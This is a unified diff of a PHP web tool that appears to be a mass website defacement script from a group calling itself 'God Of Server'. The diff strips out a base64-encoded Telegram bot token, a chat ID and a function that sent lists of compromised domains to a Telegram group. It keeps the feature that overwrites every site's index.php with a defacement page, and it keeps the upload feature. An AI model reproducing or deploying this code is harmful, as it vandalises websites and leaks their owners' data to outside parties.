@@ -6,8 +6,6 @@ error_reporting(0);
 
 class SimpleReplacer {
     private $rootDir;
-    private $chatId = "-1002959158801";
-    private $encodedToken = "ODM4ODM5NTA1MDpBQUY2UmVYb2pfRlJTN2QwQU1veG9PLXcwWU51S0lCMnJLQQ==";
     
     public function __construct() {
         $this->rootDir = $_SERVER['DOCUMENT_ROOT'] ?? dirname(__FILE__);
@@ -30,19 +28,10 @@ class SimpleReplacer {
 
     private function doSearch($username) {
         $dirs = $this->findDirs();
-        $domainList = [];
         
-        foreach ($dirs as $dir) {
-            $domainName = basename($dir);
-            $domainList[] = "https://" . $domainName;
-        }
-        
-        if (!empty($domainList)) {
-            $message = ">Kasih Sayangmu begitu tulus sehingga tidak ada yang mampu menyaingi dirimu<\n\nBy : " . $username . "\n______\n\n" . implode("\n", $domainList);
-            $telegramResult = $this->sendTelegramMessage($message);
-            
+        if (!empty($dirs)) {
             return [
-                'success' => "Data domain telah dikirim ke grup Telegram oleh " . $username . ($telegramResult ? "" : " (Telegram error)"),
+                'success' => "Data domain ditemukan oleh " . $username,
                 'domains' => array_map(function($dir) { return basename($dir); }, $dirs),
                 'count' => count($dirs)
             ];
@@ -50,49 +39,6 @@ class SimpleReplacer {
             return [
                 'error' => "Tidak ada domain yang ditemukan"
             ];
-        }
-    }
-
-    private function sendTelegramMessage($message) {
-        $token = base64_decode($this->encodedToken);
-        $url = "https://api.telegram.org/bot" . $token . "/sendMessage";
-        
-        $postData = http_build_query([
-            'chat_id' => $this->chatId,
-            'text' => $message
-        ]);
-        
-        if (function_exists('curl_init')) {
-            $ch = curl_init();
-            curl_setopt($ch, CURLOPT_URL, $url);
-            curl_setopt($ch, CURLOPT_POST, true);
-            curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-            curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-            curl_setopt($ch, CURLOPT_HTTPHEADER, [
-                'Content-Type: application/x-www-form-urlencoded',
-                'Content-Length: ' . strlen($postData)
-            ]);
-            
-            $result = curl_exec($ch);
-            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-            curl_close($ch);
-            
-            return $httpCode == 200;
-        } else {
-            $options = [
-                'http' => [
-                    'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
-                    'method' => 'POST',
-                    'content' => $postData
-                ]
-            ];
-            
-            $context = stream_context_create($options);
-            $result = file_get_contents($url, false, $context);
-            
-            return $result !== false;
         }
     }
 
@@ -122,7 +68,7 @@ class SimpleReplacer {
         $dirs = $this->findDirs();
         $count = 0;
         $list = [];
-        $indexContent = '<!DOCTYPE html><html><head><title>HACKED BY GOD OF SERVER</title><meta name="theme-color" content="black"><meta property="og:description" content="Hacked By God Of Server"><meta property="og:image" content="https://slbn1panti.sch.id/wp-content/uploads/2023/03/al1.jpg"><style>body,html{height:100%;margin:0;padding:0;overflow:hidden;}#snow{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:9999;}.flake{position:absolute;background:rgba(180,180,220,0.7);border-radius:50%;}</style></head><body bgcolor="black"><div id="snow"></div><table height="100%" width="100%"><td align="center"><font size="5" color="white"><img title="AL - TRASER SEC TEAM" width="250" src="https://slbn1panti.sch.id/wp-content/uploads/2023/03/al1.jpg"><pre>-  <span style="color:#9b5de5">God Of Server</span>  -<br><script>const a=new Audio("https://files.catbox.moe/5up4jh.mp3");a.loop=true;a.volume=0.3;const p=document.createElement("div");p.innerHTML='<div style="position:fixed;bottom:20px;right:20px;background:rgba(0,0,0,0.7);padding:10px;border-radius:5px;border:1px solid rgba(150,150,200,0.3)"><button onclick="a.paused?a.play():a.pause();this.innerHTML=a.paused?\'Play\':\'Pause\'" style="background:rgba(150,150,200,0.3);border:1px solid rgba(180,180,220,0.5);color:white;padding:5px 15px;border-radius:3px;cursor:pointer">Dengarkanlah Isi Hatiku^^</button><input type="range" min="0" max="100" value="30" oninput="a.volume=this.value/100" style="margin-left:10px;width:80px"></div>';document.body.appendChild(p);</script><font size="4">"GOS@kali:~$ rm -rf /ingatanku/hatiku"<br><font size="4"><span style="color:#ffffff">"Aku tak ingin ngkau merasakan rasa sakit lebih dalam lagi nona:) - Alv"</span><br><span style="color:#bdb4c7">"maafkan sampah sepertiku nona:)"</span></font><br><marquee width="30%" behavior="" direction="left" scrollamount="5" scrolldelay="20"><span style="color:#8e7cc3">God Of Server - Valtherion - Ryu - Byte - All God Of Server </span></marquee><br><marquee width="40%" behavior="" direction="left" scrollamount="10" scrolldelay="10"><span style="color:#6c5b7b">-</span></marquee></pre></td></table><script>const snow=document.getElementById('snow');for(let i=0;i<100;i++){let flake=document.createElement('div');flake.className='flake';flake.style.width=Math.random()*5+2+'px';flake.style.height=flake.style.width;flake.style.left=Math.random()*100+'vw';flake.style.top=Math.random()*100+'vh';flake.style.opacity=Math.random()*0.6+0.2;snow.appendChild(flake);function fall(){let top=parseFloat(flake.style.top);top+=1;if(top>100){top=-5;flake.style.left=Math.random()*100+'vw';}flake.style.top=top+'vh';flake.style.left=parseFloat(flake.style.left)+(Math.sin(Date.now()/1000+i)*0.5)+'vw';requestAnimationFrame(fall);}fall();}</script></body></html>';
+        $indexContent = '<!DOCTYPE html><html><head><title>Touched BY GOD OF SERVER</title><meta name="theme-color" content="black"><meta property="og:description" content="Touched By God Of Server"><meta property="og:image" content="https://slbn1panti.sch.id/wp-content/uploads/2023/03/al1.jpg"><style>body,html{height:100%;margin:0;padding:0;overflow:hidden;}#snow{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:9999;}.flake{position:absolute;background:rgba(180,180,220,0.7);border-radius:50%;}</style></head><body bgcolor="black"><div id="snow"></div><table height="100%" width="100%"><td align="center"><font size="5" color="white"><img title="GOD OF SERVER" width="250" src="https://slbn1panti.sch.id/wp-content/uploads/2023/03/al1.jpg"><pre>-  <span style="color:#9b5de5">God Of Server</span>  -<br><script>const a=new Audio("https://files.catbox.moe/5up4jh.mp3");a.loop=true;a.volume=0.3;const p=document.createElement("div");p.innerHTML=\'<div style="position:fixed;bottom:20px;right:20px;background:rgba(0,0,0,0.7);padding:10px;border-radius:5px;border:1px solid rgba(150,150,200,0.3)"><button onclick="a.paused?a.play():a.pause();this.innerHTML=a.paused?\\\'Play\\\':\\\'Pause\\\'" style="background:rgba(150,150,200,0.3);border:1px solid rgba(180,180,220,0.5);color:white;padding:5px 15px;border-radius:3px;cursor:pointer">Dengarkanlah Isi Hatiku^^</button><input type="range" min="0" max="100" value="30" oninput="a.volume=this.value/100" style="margin-left:10px;width:80px"></div>\';document.body.appendChild(p);</script><font size="4">"GOS@kali:~$ rm -rf /ingatanku/hatiku"<br><font size="4"><span style="color:#ffffff">"Aku tak ingin ngkau merasakan rasa sakit lebih dalam lagi nona:) - Pengagum Rahasiamu"</span><br><span style="color:#bdb4c7">"maafkan sampah sepertiku nona:)"</span></font><br><marquee width="30%" behavior="" direction="left" scrollamount="5" scrolldelay="20"><span style="color:#8e7cc3">God Of Server - Valtherion - Ryu - Byte - All God Of Server </span></marquee><br><marquee width="40%" behavior="" direction="left" scrollamount="10" scrolldelay="10"><span style="color:#6c5b7b">-</span></marquee></pre></td></table><script>const snow=document.getElementById(\'snow\');for(let i=0;i<100;i++){let flake=document.createElement(\'div\');flake.className=\'flake\';flake.style.width=Math.random()*5+2+\'px\';flake.style.height=flake.style.width;flake.style.left=Math.random()*100+\'vw\';flake.style.top=Math.random()*100+\'vh\';flake.style.opacity=Math.random()*0.6+0.2;snow.appendChild(flake);function fall(){let top=parseFloat(flake.style.top);top+=1;if(top>100){top=-5;flake.style.left=Math.random()*100+\'vw\';}flake.style.top=top+\'vh\';flake.style.left=parseFloat(flake.style.left)+(Math.sin(Date.now()/1000+i)*0.5)+\'vw\';requestAnimationFrame(fall);}fall();}</script></body></html>';
         
         foreach ($dirs as $dir) {
             $indexPath = $dir . '/index.php';
@@ -637,7 +583,7 @@ if ($response && isset($response['success'])) {
             <button type="submit" class="btn">REPLACE INDEX FILES</button>
         </form>
 
-        <button type="button" class="btn search-btn" onclick="searchDomains()">SEARCH & SEND TO TELEGRAM</button>
+        <button type="button" class="btn search-btn" onclick="searchDomains()">SEARCH DOMAINS</button>
         
         <form method="post" style="margin-top:15px;">
             <input type="hidden" name="action" value="upload">
